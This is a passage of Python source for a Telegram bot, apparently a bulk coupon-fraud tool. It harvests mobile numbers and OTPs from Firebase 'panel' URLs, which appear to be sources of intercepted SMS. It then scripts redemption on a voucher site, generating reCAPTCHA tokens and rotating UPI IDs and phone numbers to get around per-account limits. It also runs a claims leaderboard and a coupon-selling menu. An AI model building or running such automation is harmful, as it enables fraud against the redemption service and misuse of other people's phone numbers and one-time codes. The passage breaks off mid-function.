    lines.append("\n━━━━━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 **Total Coupons Claimed (All Users):** `{total_all_claims}`")

    if user_rank_info:
        lines.append(
            f"👤 **Your Rank:** `#{user_rank_info[0]}` (`{user_rank_info[1]}` Coupons Claimed)"
        )
    else:
        lines.append("👤 **Your Rank:** Unranked (`0` Coupons Claimed)")

    return "\n".join(lines)


# ==========================================
# 5. SESSION STORAGE HELPERS
# ==========================================
def save_panels_to_user_session(context: ContextTypes.DEFAULT_TYPE, new_results: list[dict]) -> int:
    """Saves all checked panels (active and inactive) to the user's active session."""
    if "session_panels" not in context.user_data:
        context.user_data["session_panels"] = {}

    session_panels: dict = context.user_data["session_panels"]

    for item in new_results:
        endpoint = item["firebase_endpoint"]
        session_panels[endpoint] = {
            "submitted_url": item["submitted_url"],
            "firebase_endpoint": endpoint,
            "status": item["status"],
            "is_active": item["status"].startswith("Active"),
            "checked_at": item["timestamp"],
        }

    return len(session_panels)


# ==========================================
# 6. CORE PROCESSING LOGIC (FIREBASE)
# ==========================================
async def check_single_url_worker(
    semaphore: asyncio.Semaphore,
    original_url: str,
    extracted_firebase: str,
    on_done_callback: Optional[Callable[[dict], Awaitable[None]]] = None,
) -> dict:
    async with semaphore:
        fb_status = await asyncio.to_thread(check_firebase_sms_status, extracted_firebase)

    result = {
        "submitted_url": original_url,
        "firebase_endpoint": extracted_firebase,
        "status": fb_status,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    if callable(on_done_callback):
        try:
            await on_done_callback(result)
        except Exception:
            pass
    return result


async def process_text_data_for_bot(
    text: str,
    context: ContextTypes.DEFAULT_TYPE,
    is_from_file: bool = False,
    link_progress_callback: Optional[Callable[[int, int, dict], Awaitable[None]]] = None,
) -> tuple[list[str], bool]:
    urls_found = extract_urls_from_text(text)

    if is_from_file:
        if not urls_found:
            return [
                "🚫 **Invalid File Content (Rejected)**\n"
                "No valid links were found inside the uploaded file.\n\n"
                "📌 Please upload a `.txt` or `.zip` file containing valid **Firebase / Panel links**."
            ], False

        valid_pairs, rejected_count = filter_valid_firebase_urls(urls_found)
        if not valid_pairs:
            return [
                "🚫 **Invalid Links File (Rejected)**\n"
                f"Found `{len(urls_found)}` links in this file, but **none of them are valid Firebase / Panel endpoints**.\n\n"
                "📌 Unrelated text or non-Firebase links are not accepted. "
                "Please upload a `.txt` or `.zip` file containing valid Firebase/Panel URLs."
            ], False
    else:
        if len(urls_found) > MAX_DIRECT_LINKS:
            return [
                f"🚫 **Limit Exceeded:** You submitted `{len(urls_found)}` links at once.\n"
                f"⚠️ Direct message input supports a maximum of `{MAX_DIRECT_LINKS}` links.\n\n"
                "📄 Please place all links inside a **`.txt`** or **`.zip`** file and upload it here."
            ], False
        valid_pairs, rejected_count = filter_valid_firebase_urls(urls_found)

    extracted_data = extract_numbers_and_otps(text) if not is_from_file else {"numbers": [], "otps": []}
    numbers = extracted_data["numbers"]
    otps = extracted_data["otps"]

    valid_results = []
    output_blocks = []
    has_active = False

    if valid_pairs:
        total_pairs = len(valid_pairs)
        checked_counter = 0
        progress_lock = asyncio.Lock()

        async def _item_done(item_res: dict):
            nonlocal checked_counter
            async with progress_lock:
                checked_counter += 1
                current_done = checked_counter
            if callable(link_progress_callback):
                try:
                    await link_progress_callback(current_done, total_pairs, item_res)
                except Exception:
                    pass

        semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
        tasks = [
            check_single_url_worker(semaphore, orig_url, fb_url, on_done_callback=_item_done)
            for orig_url, fb_url in valid_pairs
        ]
        valid_results = await asyncio.gather(*tasks)

        has_active = any(item["status"].startswith("Active") for item in valid_results)
        total_in_session = save_panels_to_user_session(context, valid_results)

        rejected_note = (
            f"\n⚠️ *({rejected_count} invalid/non-Firebase links were ignored)*"
            if rejected_count > 0
            else ""
        )

        output_blocks.append(
            f"✅ **Found `{len(valid_results)}` Valid Firebase Endpoints and Saved to Session**\n"
            f"📌 *(Total panels saved in current session: `{total_in_session}`)*"
            f"{rejected_note}\n"
        )
        for idx, item in enumerate(valid_results, 1):
            block = (
                f"**[{idx}] Endpoint :** `{item['firebase_endpoint']}`\n"
                f"      **Status   :** {item['status']}\n"
                f"      **Source   :** `{item['submitted_url']}`\n"
            )
            output_blocks.append(block)
    elif not numbers and not otps:
        output_blocks.append(
            "❌ **Firebase Endpoint Not Found:** No valid Firebase endpoint could be extracted from the provided links."
        )

    if numbers or otps:
        numbers_str = ", ".join(numbers) if numbers else "None"
        otps_str = ", ".join(otps) if otps else "None"

        output_blocks.append(
            f"\n🔍 **Extracted Details:**\n"
            f"  • **Mobile Numbers :** `{numbers_str}`\n"
            f"  • **OTPs / Codes   :** `{otps_str}`"
        )

    if not valid_results and not urls_found and not numbers and not otps:
        output_blocks.append(
            "⚠️ **No Data Found:** No valid mobile numbers, OTPs, or Firebase URLs were detected."
        )

    messages = []
    current_msg = ""
    for block in output_blocks:
        if len(current_msg) + len(block) + 2 > 3800:
            messages.append(current_msg)
            current_msg = block
        else:
            current_msg += ("\n" if current_msg else "") + block

    if current_msg:
        messages.append(current_msg)

    return messages, has_active


# ==========================================
# 7. KEYBOARDS & UI DESIGN
# ==========================================
def get_main_menu_keyboard() -> ReplyKeyboardMarkup:
    """Main reply keyboard menu."""
    keyboard = [
        ["Claim Coupon", "Check Coupon"],
        ["Buy Coupon", "Support"],
        ["🏆 Leaderboard"],
    ]
    return ReplyKeyboardMarkup(
        keyboard,
        resize_keyboard=True,
        one_time_keyboard=False,
    )


def get_claim_coupon_inline_keyboard() -> InlineKeyboardMarkup:
    keyboard = [
        [
            InlineKeyboardButton(
                "Paste Firebase URL Direct",
                callback_data="claim_paste_firebase",
            )
        ],
        [
            InlineKeyboardButton(
                "Direct Send Your Mobile Number",
                callback_data="claim_send_mobile",
            )
        ],
        [
            InlineKeyboardButton(
                "❌ Cancel",
                callback_data="claim_cancel_main",
            )
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_cancel_to_claim_keyboard() -> InlineKeyboardMarkup:
    keyboard = [
        [
            InlineKeyboardButton(
                "❌ Cancel",
                callback_data="back_to_claim_menu",
            )
        ]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_keep_existing_upi_keyboard() -> InlineKeyboardMarkup:
    keyboard = [
        [
            InlineKeyboardButton(
                "❌ Cancel (Keep Existing UPI)",
                callback_data="fb_keep_existing_upi",
            )
        ]
    ]
    return InlineKeyboardMarkup(keyboard)


def get_firebase_triplet_keyboard() -> InlineKeyboardMarkup:
    keyboard = [
        [
            InlineKeyboardButton(
                "✅ Redeemed (Next Pair)",
                callback_data="fb_next_triplet",
            ),
            InlineKeyboardButton(
                "🔄 Failed (Return Coupon)",
                callback_data="fb_retry_coupon",
            ),
        ],
        [
            InlineKeyboardButton(
                "❌ Cancel",
                callback_data="back_to_claim_menu",
            )
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_support_inline_keyboard() -> InlineKeyboardMarkup:
    """Direct support Telegram link button."""
    keyboard = [
        [
            InlineKeyboardButton(
                "💬 Contact Support (@gbx_support_bot)",
                url="https://t.me/gbx_support_bot",
            )
        ]
    ]
    return InlineKeyboardMarkup(keyboard)


CLAIM_PANEL_TEXT = (
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "🚀 **Firebase Bulk Auto Claimer**\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "Please select an option below to proceed:\n"
)

PASTE_URL_PROMPT_TEXT = (
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "📥 **Direct / Bulk / File Firebase Input**\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "Please send your **Firebase URL** directly, paste **multiple URLs in bulk** "
    "(up to 20 links at once), or upload a **`.txt` or `.zip` file** containing **only your Firebase/Panel links**.\n\n"
    "👇 *Send your links or file below, or tap Cancel to go back:*"
)

CHECK_COUPON_PROMPT_TEXT = (
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "🔍 **Coupon Status Checker**\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "Please send your **Single Coupon**, **Bulk Coupons** (space, comma, or line-separated), or upload a **`.txt` file**.\n\n"
    "👇 *Send your coupon codes or `.txt` file below, or tap Cancel:*"
)

COUPON_PROMPT_AFTER_ACTIVE_TEXT = (
    "🎟️ **Active Firebase Panel Verified! Now Send Your Coupon Codes:**\n\n"
    "• You can send a **Single Coupon**, **Multiple Coupons** (space, comma, or line-separated), or upload a **`.txt` file**.\n\n"
    "👇 *Send your coupon codes below or tap Cancel:*"
)


def build_fresh_upi_prompt_text(coupon_count: int) -> str:
    return (
        f"✅ **Total `{coupon_count}` Coupon Codes Saved Successfully!**\n\n"
        "💳 **Now Please Enter a Fresh UPI ID (e.g., `name@upi`):**\n"
        f"⚠️ *This UPI ID will remain locked for **{MAX_FIREBASE_UPI_USES} consecutive claims**. Once all {MAX_FIREBASE_UPI_USES} uses are completed, you will be prompted for a new UPI ID (duplicate UPI IDs are not permitted).*\n\n"
        "👇 *Enter your fresh UPI ID below or tap Cancel:*"
    )


def build_existing_upi_change_prompt_text(upi_cfg: dict) -> str:
    current_upi = upi_cfg.get("upi_id", "")
    used_count = upi_cfg.get("used_count", 0)
    max_uses = upi_cfg.get("max_uses", MAX_FIREBASE_UPI_USES)
    remaining_uses = upi_cfg.get("remaining_uses", max_uses)
    return (
        "⚠️ **Active UPI ID Already Assigned**\n\n"
        f"Your previous UPI ID `{current_upi}` has not completed all `{max_uses}` uses yet "
        f"*(`{used_count}/{max_uses}` used, `{remaining_uses}` remaining)*.\n\n"
        "Would you like to change this UPI ID?\n"
        "• Send a **new UPI ID** directly below to replace it, or tap **Cancel** to keep using `{current_upi}` and resume automatically."
    ).replace("{current_upi}", current_upi)


NEXT_NEW_UPI_PROMPT_TEXT = (
    "🔄 **All 8 Usage Slots Completed! Please Enter a New Fresh UPI ID (e.g., `name@upi`):**\n"
    "⚠️ *Previously used or duplicate UPI IDs will be rejected.*"
)

FINAL_PNL_BATCH_COMPLETE_TEXT = (
    "🎉 Process completed successfully! Send /pnlclaim to start a new session."
)


def build_atoz_claim_log_text(
    triplet_entry: dict,
    upi_slot: dict,
    remaining_coupons: int,
    server_message: str,
) -> str:
    """Builds the full A-to-Z claim log after each successful coupon redemption."""
    return (
        "✅ **Coupon Successfully Redeemed — Full A-to-Z Claim Log**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎟️ **Coupon Code   :** `{triplet_entry['coupon']}`\n"
        f"📱 **Mobile Number :** `{triplet_entry['number']}` *(Use `{triplet_entry.get('number_use_count', 1)}/{triplet_entry.get('number_max_uses', MAX_FIREBASE_NUMBER_USES)}`)*\n"
        f"🔑 **Verified OTP  :** `{triplet_entry['otp']}`\n"
        f"💳 **UPI ID        :** `{triplet_entry['upi_id']}` *(Use `{upi_slot['used_count']}/{upi_slot['max_uses']}`)*\n"
        f"🌐 **Firebase Node :** `{triplet_entry['source_endpoint']}`\n"
        f"🕒 **Claimed Time  :** `{triplet_entry['created_at']}`\n"
        f"📊 **Status        :** `Successfully Redeemed`\n"
        f"📩 **Server Reply  :** {server_message}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 **Remaining Unused Coupons:** `{remaining_coupons}` | **UPI Uses Left:** `{upi_slot['remaining_uses']}`"
    )


def _has_preserved_coupons(context: ContextTypes.DEFAULT_TYPE) -> bool:
    all_coupons: list[str] = context.user_data.get("firebase_coupons", [])
    used_coupons: list[str] = context.user_data.get("used_firebase_coupons", [])
    return any(c not in used_coupons for c in all_coupons)


def _has_active_upi_with_slots(context: ContextTypes.DEFAULT_TYPE) -> bool:
    upi_cfg = context.user_data.get("firebase_upi_config")
    return bool(upi_cfg and not upi_cfg.get("completed", False) and upi_cfg.get("remaining_uses", 0) > 0)


async def _resume_or_prompt_after_active_panel(message_target, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Resumes saved coupon queue / active UPI automatically if available, otherwise prompts."""
    if _has_preserved_coupons(context):
        if _has_active_upi_with_slots(context):
            return await send_firebase_assigned_triplet(message_target, context)
        upi_cfg = context.user_data.get("firebase_upi_config")
        if upi_cfg and upi_cfg.get("remaining_uses", 0) > 0:
            await message_target.reply_text(
                build_existing_upi_change_prompt_text(upi_cfg),
                reply_markup=get_keep_existing_upi_keyboard(),
                parse_mode=ParseMode.MARKDOWN,
            )
            return WAITING_FOR_FIREBASE_UPI
        coupon_count = len(context.user_data.get("firebase_coupons", []))
        await message_target.reply_text(
            build_fresh_upi_prompt_text(coupon_count),
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return WAITING_FOR_FIREBASE_UPI

    await message_target.reply_text(
        COUPON_PROMPT_AFTER_ACTIVE_TEXT,
        reply_markup=get_cancel_to_claim_keyboard(),
        parse_mode=ParseMode.MARKDOWN,
    )
    return WAITING_FOR_FIREBASE_COUPONS


# ==========================================
# 8. BOT HANDLERS
# ==========================================
def _extract_telegram_user_info(update: Update) -> dict:
    user = update.effective_user
    if not user:
        return {"user_id": 0, "user_name": "Unknown"}
    display_name = user.full_name or (f"@{user.username}" if user.username else f"User {user.id}")
    return {
        "user_id": user.id,
        "user_name": display_name,
    }


async def send_welcome_portal(message_target, old_count: int = 0) -> None:
    """Sends the main welcome message and menu keyboard."""
    reset_note = (
        f"\n🔄 *Previous session ({old_count} panels) has been cleared and a fresh session has started.*\n"
        if old_count > 0
        else ""
    )
    await message_target.reply_text(
        "👋 **Welcome to the Coupon Automation Portal!**\n"
        f"{reset_note}\n"
        "Please choose an option from the menu below to get started:",
        reply_markup=get_main_menu_keyboard(),
        parse_mode=ParseMode.MARKDOWN,
    )


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    chat_id = update.effective_chat.id

    await cancel_running_claim_task(chat_id)
    await close_user_session(chat_id)
    old_count = len(context.user_data.get("session_panels", {}))
    context.user_data.clear()
    context.user_data["session_panels"] = {}
    context.user_data["session_started_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if not await ensure_user_subscribed(update, context):
        return ConversationHandler.END

    await send_welcome_portal(update.message, old_count=old_count)
    return ConversationHandler.END


async def pnlclaim_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Directly triggers the Firebase URL input flow (/pnlclaim)."""
    if not update.message or update.effective_chat.type != "private":
        return ConversationHandler.END

    if not await ensure_user_subscribed(update, context):
        return ConversationHandler.END

    user_info = _extract_telegram_user_info(update)
    context.user_data["telegram_user_info"] = user_info

    await update.message.reply_text(
        text=PASTE_URL_PROMPT_TEXT,
        reply_markup=get_cancel_to_claim_keyboard(),
        parse_mode=ParseMode.MARKDOWN,
    )
    return WAITING_FOR_FIREBASE_INPUT


async def claim_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Directly triggers the Direct Mobile Number claim flow (/claim)."""
    if not update.message or update.effective_chat.type != "private":
        return ConversationHandler.END

    if not await ensure_user_subscribed(update, context):
        return ConversationHandler.END

    chat_id = update.effective_chat.id

    async with get_user_lock(chat_id):
        status_msg = await update.message.reply_text("⏳ Preparing a new session, please wait...")
        token_ok = await init_user_session(chat_id)

        if not token_ok:
            await status_msg.edit_text(
                "⚠️ Unable to fetch initial session token from the website. "
                "Please check your connection and try again.",
                reply_markup=get_cancel_to_claim_keyboard(),
            )
            return ConversationHandler.END

        await status_msg.edit_text(
            "🚀 New session initialized.\nPlease enter your 10-digit mobile number:",
            reply_markup=get_cancel_to_claim_keyboard(),
        )
        return WAITING_FOR_DIRECT_MOBILE_FLOW


async def handle_claim_coupon_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not await ensure_user_subscribed(update, context):
        return ConversationHandler.END

    context.user_data["telegram_user_info"] = _extract_telegram_user_info(update)

    await update.message.reply_text(
        CLAIM_PANEL_TEXT,
        reply_markup=get_claim_coupon_inline_keyboard(),
        parse_mode=ParseMode.MARKDOWN,
    )
    return ConversationHandler.END


async def handle_check_coupon_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not await ensure_user_subscribed(update, context):
        return ConversationHandler.END

    context.user_data["telegram_user_info"] = _extract_telegram_user_info(update)

    await update.message.reply_text(
        CHECK_COUPON_PROMPT_TEXT,
        reply_markup=get_cancel_to_claim_keyboard(),
        parse_mode=ParseMode.MARKDOWN,
    )
    return WAITING_FOR_CHECK_COUPONS


async def _run_coupon_check_batch(message_target, coupons: list[str]) -> None:
    """Checks each coupon one by one using Step 1, closes session after OTP trigger, and sends results."""
    total = len(coupons)
    status_msg = await message_target.reply_text(
        f"⏳ Checking coupons (0/{total})...",
        parse_mode=None,
    )

    valid_coupons: list[str] = []
    invalid_lines: list[str] = []

    for idx, code in enumerate(coupons, 1):
        try:
            await status_msg.edit_text(
                f"🔄 Checking coupon {idx}/{total}: {code}",
                parse_mode=None,
            )
        except Exception:
            pass

        is_valid, detail = await check_single_coupon_step1(code)
        if is_valid:
            valid_coupons.append(code)
        else:
            invalid_lines.append(f"❌ {code} — {detail}")

    try:
        await status_msg.delete()
    except Exception:
        pass

    if valid_coupons:
        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".txt", encoding="utf-8") as tmp:
            tmp.write("\n".join(valid_coupons) + "\n")
            valid_txt_path = tmp.name

        try:
            with open(valid_txt_path, "rb") as f:
                await message_target.reply_document(
                    document=f,
                    filename="valid_coupons.txt",
                    caption=f"✅ Valid Coupons ({len(valid_coupons)})",
                )
        finally:
            if os.path.exists(valid_txt_path):
                os.remove(valid_txt_path)
    else:
        await message_target.reply_text("ℹ️ No valid coupons found.", parse_mode=None)

    if invalid_lines:
        await _send_safe_long_text(
            message_target,
            "❌ Invalid Coupons:\n" + "\n".join(invalid_lines),
            parse_mode=None,
            disable_web_page_preview=True,
        )


async def receive_check_coupons_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_text = update.message.text.strip()

    if user_text in {"Claim Coupon", "Check Coupon", "Buy Coupon", "Support", "🏆 Leaderboard"}:
        if user_text == "Claim Coupon":
            await handle_claim_coupon_menu(update, context)
            return ConversationHandler.END
        elif user_text == "Check Coupon":
            return await handle_check_coupon_menu(update, context)
        else:
            await handle_other_main_buttons(update, context)
            return ConversationHandler.END

    if not await ensure_user_subscribed(update, context):
        return ConversationHandler.END

    coupons = extract_coupon_codes_from_text(user_text)
    if not coupons:
        await update.message.reply_text(
            "❌ No valid coupon codes found. Please send single/bulk coupons or upload a .txt file:",
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=None,
        )
        return WAITING_FOR_CHECK_COUPONS

    await _run_coupon_check_batch(update.message, coupons)
    return ConversationHandler.END


async def receive_check_coupons_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not await ensure_user_subscribed(update, context):
        return ConversationHandler.END

    document = update.message.document
    file_name = (document.file_name or "").lower() if document else ""

    if not document or not file_name.endswith(".txt"):
        await update.message.reply_text(
            "⚠️ Please upload a .txt file containing coupon codes or send them directly:",
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=None,
        )
        return WAITING_FOR_CHECK_COUPONS

    temp_file_path = None
    try:
        tg_file = await context.bot.get_file(document.file_id)
        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as tmp:
            temp_file_path = tmp.name

        await tg_file.download_to_drive(temp_file_path)
        extracted_text = await asyncio.to_thread(read_text_from_txt, temp_file_path)

        coupons = extract_coupon_codes_from_text(extracted_text)
        if not coupons:
            await update.message.reply_text(
                "❌ No valid coupon codes found in the .txt file. Please upload a valid .txt file:",
                reply_markup=get_cancel_to_claim_keyboard(),
                parse_mode=None,
            )
            return WAITING_FOR_CHECK_COUPONS

        await _run_coupon_check_batch(update.message, coupons)
        return ConversationHandler.END
    finally:
        if temp_file_path and os.path.exists(temp_file_path):
            os.remove(temp_file_path)


async def handle_other_main_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_user_subscribed(update, context):
        return

    text = update.message.text
    if text == "Check Coupon":
        await handle_check_coupon_menu(update, context)
    elif text == "Buy Coupon":
        await update.message.reply_text(
            "🛒 **Buy Coupon**\nThis feature will be configured shortly.",
            parse_mode=ParseMode.MARKDOWN,
        )
    elif text == "Support":
        await update.message.reply_text(
            "🎧 **Customer Support**\n\n"
            "For assistance or inquiries, please contact our support team using the button below:",
            reply_markup=get_support_inline_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
    elif text == "🏆 Leaderboard":
        user_id = update.effective_user.id if update.effective_user else 0
        lb_text = await get_leaderboard_text(user_id)
        await _send_safe_long_text(
            update.message,
            lb_text,
            parse_mode=ParseMode.MARKDOWN,
        )


async def verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Verifies channel membership when the Verify button is clicked."""
    query = update.callback_query
    if not query or query.message.chat.type != "private":
        return ConversationHandler.END

    await query.answer()
    user_id = query.from_user.id

    unjoined = await get_unjoined_channels(context.bot, user_id)
    if unjoined:
        reply_markup = build_join_keyboard(unjoined)
        try:
            await query.edit_message_text(
                "🚫 **Verification Failed**\n\n"
                "You still have not joined all required channels/groups listed below.\n"
                "Please join them and tap **'✅ Verify Membership'** again:",
                reply_markup=reply_markup,
                parse_mode="Markdown",
            )
        except Exception:
            pass
        return ConversationHandler.END

    await query.edit_message_text("✅ **Verification Successful!**", parse_mode="Markdown")
    await send_welcome_portal(query.message, old_count=0)
    return ConversationHandler.END


async def claim_inline_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    data = query.data
    chat_id = query.message.chat.id

    if not await ensure_user_subscribed(update, context):
        return ConversationHandler.END

    context.user_data["telegram_user_info"] = _extract_telegram_user_info(update)

    if data == "claim_paste_firebase":
        await query.edit_message_text(
            text=PASTE_URL_PROMPT_TEXT,
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return WAITING_FOR_FIREBASE_INPUT

    elif data == "claim_send_mobile":
        async with get_user_lock(chat_id):
            await query.edit_message_text("⏳ Preparing a new session, please wait...")
            token_ok = await init_user_session(chat_id)

            if not token_ok:
                await query.edit_message_text(
                    "⚠️ Unable to fetch initial session token from the website. "
                    "Please check your connection and try again.",
                    reply_markup=get_cancel_to_claim_keyboard(),
                )
                return ConversationHandler.END

            await query.edit_message_text(
                "🚀 New session initialized.\nPlease enter your 10-digit mobile number:",
                reply_markup=get_cancel_to_claim_keyboard(),
            )
            return WAITING_FOR_DIRECT_MOBILE_FLOW

    elif data == "fb_keep_existing_upi":
        upi_cfg = context.user_data.get("firebase_upi_config")
        if upi_cfg and upi_cfg.get("remaining_uses", 0) > 0:
            try:
                await query.edit_message_text(
                    f"✅ Keeping existing UPI ID `{upi_cfg['upi_id']}` and resuming auto-claim...",
                    parse_mode=ParseMode.MARKDOWN,
                )
            except Exception:
                pass
            return await send_firebase_assigned_triplet(query.message, context)
        return await send_firebase_assigned_triplet(query.message, context)

    elif data == "fb_next_triplet":
        triplets = context.user_data.get("firebase_assigned_triplets", [])
        if triplets:
            triplets[-1]["status"] = "Redeemed"
        return await send_firebase_assigned_triplet(query.message, context)

    elif data == "fb_retry_coupon":
        triplets = context.user_data.get("firebase_assigned_triplets", [])
        failed_coupon = triplets[-1].get("coupon") if triplets else None
        if triplets:
            triplets[-1]["status"] = "Failed_Returned"

        returned = release_unredeemed_firebase_coupon(context, failed_coupon)
        if returned:
            await query.message.reply_text(
                f"♻️ **Coupon `{returned}` was not redeemed and has been returned to the available pool.**\n"
                "🔄 Retrying with the next available online number...",
                parse_mode=ParseMode.MARKDOWN,
            )
        return await send_firebase_assigned_triplet(query.message, context)

    elif data == "back_to_claim_menu":
        await cancel_running_claim_task(chat_id)
        await close_user_session(chat_id)
        try:
            await query.edit_message_text(
                text=CLAIM_PANEL_TEXT,
                reply_markup=get_claim_coupon_inline_keyboard(),
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception:
            await query.message.reply_text(
                text=CLAIM_PANEL_TEXT,
                reply_markup=get_claim_coupon_inline_keyboard(),
                parse_mode=ParseMode.MARKDOWN,
            )
        return ConversationHandler.END

    elif data == "claim_cancel_main":
        await cancel_running_claim_task(chat_id)
        await close_user_session(chat_id)
        await query.edit_message_text(
            text="❌ **Action Cancelled.** Please select an option from the main menu below.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return ConversationHandler.END

    return ConversationHandler.END


async def receive_direct_mobile_flow_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Executes the 4-step direct mobile claim workflow on Woohoo."""
    if not update.message or not update.message.text or update.effective_chat.type != "private":
        return WAITING_FOR_DIRECT_MOBILE_FLOW

    text = update.message.text.strip()

    if text in {"Claim Coupon", "Check Coupon", "Buy Coupon", "Support", "🏆 Leaderboard"}:
        await close_user_session(update.effective_chat.id)
        if text == "Claim Coupon":
            await handle_claim_coupon_menu(update, context)
            return ConversationHandler.END
        elif text == "Check Coupon":
            return await handle_check_coupon_menu(update, context)
        else:
            await handle_other_main_buttons(update, context)
            return ConversationHandler.END

    if not await ensure_user_subscribed(update, context):
        return ConversationHandler.END

    chat_id = update.effective_chat.id

    async with get_user_lock(chat_id):
        session_data = user_sessions.get(chat_id)
        if not session_data:
            await update.message.reply_text("⏳ Initializing session, please wait...")
            token_ok = await init_user_session(chat_id)
            if not token_ok:
                await update.message.reply_text(
                    "⚠️ Unable to connect to the website. Please tap Cancel and try again.",
                    reply_markup=get_cancel_to_claim_keyboard(),
                )
                return ConversationHandler.END
            await update.message.reply_text(
                "Please enter your 10-digit mobile number:",
                reply_markup=get_cancel_to_claim_keyboard(),
            )
            return WAITING_FOR_DIRECT_MOBILE_FLOW

        session_data["last_activity"] = time.time()
        current_step = session_data["step"]
        client: UnifiedSessionClient = session_data["client"]

        # STEP 1: Mobile Number Input & Validation
        if current_step == "AWAITING_MOBILE":
            if not (text.isdigit() and len(text) == 10):
                await update.message.reply_text(
                    "❌ Invalid mobile number. Please enter a valid 10-digit mobile number:",
                    reply_markup=get_cancel_to_claim_keyboard(),
                )
                return WAITING_FOR_DIRECT_MOBILE_FLOW

            session_data["mobile"] = text
            session_data["step"] = "AWAITING_CODE"
            await update.message.reply_text(
                "✅ Mobile number saved.\nNow please enter your unique coupon code:",
                reply_markup=get_cancel_to_claim_keyboard(),
            )
            return WAITING_FOR_DIRECT_MOBILE_FLOW

        # STEP 2: Coupon Code Input & API Step 1 Call
        elif current_step == "AWAITING_CODE":
            session_data["code"] = text.upper()
            await update.message.reply_text("⏳ Verifying coupon code, please wait...")

            recaptcha_token = await client.get_dynamic_token(action="submit")

            payload_step_1 = {
                "__RequestVerificationToken": session_data["dynamic_token"],
                "token": recaptcha_token,
                "curPage": "1",
                "maxPage": "3",
                "stateDropdown": session_data["state_dropdown"],
                "cityDropdown": "0",
                "branchDropdown": "0",
                "retailerDropdown": "0",
                "talukanameDropdown": "0",
                "parametersOccurance": "0",
                "CALLPANNAMEMATCH": "0",
                "MOBILE": session_data["mobile"],
                "COUPONCODE": session_data["code"],
                "STATE": session_data["state"],
                "CHECKBOX1": "on",
                "OTP": "",
                "REDEMPTIONTYPE": "",
                "ChoiceAnswer": "",
            }

            try:
                res_json = await safe_post_json(client, API_ENDPOINT, payload_step_1)

                if res_json.get("token"):
                    session_data["dynamic_token"] = res_json["token"]

                if not res_json.get("error", True):
                    session_data["step"] = "AWAITING_OTP"
                    server_msg = res_json.get("messageBody") or "OTP has been dispatched."
                    await update.message.reply_text(
                        f"📩 {server_msg}\nPlease enter the received OTP:",
                        reply_markup=get_cancel_to_claim_keyboard(),
                    )
                else:
                    error_msg = res_json.get("messageBody") or str(res_json)
                    await update.message.reply_text(
                        f"❌ Website Error: {error_msg}\nPlease enter a valid coupon code (or tap Cancel):",
                        reply_markup=get_cancel_to_claim_keyboard(),
                    )
                return WAITING_FOR_DIRECT_MOBILE_FLOW

            except Exception as e:
                await close_user_session(chat_id)
                await update.message.reply_text(
                    f"⚠️ Network or API Error: {str(e)}\nSend /claim to start a new session."
                )
                return ConversationHandler.END

        # STEP 3: OTP Verification
        elif current_step == "AWAITING_OTP":
            if not text.isdigit():
                await update.message.reply_text(
                    "❌ Invalid OTP. Please enter digits only:",
                    reply_markup=get_cancel_to_claim_keyboard(),
                )
                return WAITING_FOR_DIRECT_MOBILE_FLOW

            session_data["otp"] = text
            await update.message.reply_text("⏳ Verifying OTP, please wait...")

            recaptcha_token = await client.get_dynamic_token(action="submit")

            payload_step_2 = {
                "__RequestVerificationToken": session_data["dynamic_token"],
                "token": recaptcha_token,
                "curPage": "2",
                "maxPage": "3",
                "stateDropdown": session_data["state_dropdown"],
                "cityDropdown": "0",
                "branchDropdown": "0",
                "retailerDropdown": "0",
                "talukanameDropdown": "0",
                "parametersOccurance": "0",
                "CALLPANNAMEMATCH": "0",
                "MOBILE": session_data["mobile"],
                "COUPONCODE": session_data["code"],
                "STATE": session_data["state"],
                "CHECKBOX1": "on",
                "OTP": session_data["otp"],
                "REDEMPTIONTYPE": "",
                "ChoiceAnswer": "",
            }

            try:
                res_2_json = await safe_post_json(client, API_ENDPOINT, payload_step_2)

                if res_2_json.get("token"):
                    session_data["dynamic_token"] = res_2_json["token"]

                if res_2_json.get("error", True):
                    error_msg = res_2_json.get("messageBody") or str(res_2_json)
                    await update.message.reply_text(
                        f"❌ Website Error: {error_msg}\nPlease re-enter the correct OTP (or tap Cancel):",
                        reply_markup=get_cancel_to_claim_keyboard(),
                    )
                    return WAITING_FOR_DIRECT_MOBILE_FLOW

                session_data["step"] = "AWAITING_UPI"
                await update.message.reply_text(
